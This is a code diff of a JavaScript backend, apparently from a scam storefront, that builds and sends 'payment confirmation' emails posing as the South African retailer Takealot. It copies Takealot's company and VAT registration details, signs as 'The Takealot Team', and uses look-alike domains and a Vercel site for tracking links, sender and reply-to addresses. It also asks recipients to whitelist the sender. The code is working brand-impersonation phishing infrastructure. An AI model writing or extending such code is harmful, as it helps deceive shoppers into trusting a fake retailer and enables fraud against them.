@@ -148,7 +148,7 @@ function renderOrderPlainText(order) {
   const customerName = order.customer_name || 'Customer';
   const orderNumber = order.order_id;
   const variant = 'Titan Pro';
-  const trackUrl = `https://www.takealot-promo.online/track.html?order=${orderNumber}`;
+  const trackUrl = `${process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app'}/track.html?ref=${orderNumber}`;
 
   return [
     `TAKEALOT PAYMENT CONFIRMATION`,
@@ -180,7 +180,7 @@ function renderOrderPlainText(order) {
     `TRACK YOUR ORDER:`,
     `${trackUrl}`,
     ``,
-    `Need help? Find answers at https://www.takealot-promo.online`,
+    `Need help? Find answers at ${process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app'}`,
     ``,
     `Regards,`,
     `The Takealot Team`,
@@ -189,7 +189,7 @@ function renderOrderPlainText(order) {
     `Takealot Online (Pty) Ltd • Reg. No. 2010/020248/07 • VAT No. 4440256861`,
     `12 Rua Vasco Da Gama, Foreshore, Cape Town, 8001, South Africa`,
     `This is an automated transactional order confirmation.`,
-    `To ensure you receive future order notifications in your Primary inbox, please add orders@takealot-promo.online to your contacts or safe sender list.`,
+    `To ensure you receive future order notifications in your Primary inbox, please add orders@onboarding.resend.dev to your contacts or safe sender list.`,
   ].join('\n');
 }
 
@@ -229,7 +229,7 @@ async function sendOrderConfirmationEmail(order) {
           subject,
           html,
           text: plainText,
-          reply_to: 'support@takealot-promo.online',
+          reply_to: 'support@ps5fim-s11m.vercel.app',
           headers: {
             'Auto-Submitted': 'auto-generated',
             'X-Auto-Response-Suppress': 'All',
@@ -251,7 +251,7 @@ async function sendOrderConfirmationEmail(order) {
 
   // ── Fallback: Resend ────────────────────────────────────────────────────────
   if (resendKey) {
-    const fromEmail = process.env.EMAIL_FROM || 'Takealot Orders <orders@take.baridi.shop>';
+    const fromEmail = process.env.EMAIL_FROM || 'Takealot Orders <orders@onboarding.resend.dev>';
     try {
       const res = await fetch('https://api.resend.com/emails', {
         method: 'POST',
@@ -265,7 +265,7 @@ async function sendOrderConfirmationEmail(order) {
           subject,
           html,
           text: plainText,
-          reply_to: process.env.EMAIL_REPLY_TO || 'support@take.baridi.shop',
+          reply_to: process.env.EMAIL_REPLY_TO || 'support@ps5fim-s11m.vercel.app',
         }),
       });
       const data = await res.json().catch(() => null);
@@ -282,7 +282,7 @@ async function sendOrderConfirmationEmail(order) {
 
   // ── Fallback: SendGrid ──────────────────────────────────────────────────────
   if (sendgridKey) {
-    const fromEmail = process.env.EMAIL_FROM || 'Takealot <orders@takealot-promo.online>';
+    const fromEmail = process.env.EMAIL_FROM || 'Takealot <orders@onboarding.resend.dev>';
     try {
       const res = await fetch('https://api.sendgrid.com/v3/mail/send', {
         method: 'POST',
@@ -292,8 +292,8 @@ async function sendOrderConfirmationEmail(order) {
         },
         body: JSON.stringify({
           personalizations: [{ to: [{ email: order.customer_email }] }],
-          from: { email: fromEmail.replace(/^.*<([^>]+)>.*$/, '$1') || 'orders@takealot-promo.online', name: 'Takealot' },
-          reply_to: { email: 'support@takealot-promo.online', name: 'Takealot Support' },
+          from: { email: fromEmail.replace(/^.*<([^>]+)>.*$/, '$1') || 'orders@onboarding.resend.dev', name: 'Takealot' },
+          reply_to: { email: 'support@ps5fim-s11m.vercel.app', name: 'Takealot Support' },
           subject,
           content: [
             { type: 'text/plain', value: plainText },
@@ -500,7 +500,7 @@ async function handler(req, res) {
     received_date: (existing && existing.received_date) || receivedAt,
     delivery_date: (existing && existing.delivery_date) || deliveredAt,
     // Tracking URL: dynamic with real ID
-    tracking_url: 'https://www.takealot-promo.online/track.html?order=' + encodeURIComponent(orderId),
+    tracking_url: `${process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app'}/track.html?ref=${encodeURIComponent(orderId)}`,
     // Status
     status: (existing && existing.status) || 'PROCESSING',
     status_history: (existing && existing.status_history) || [
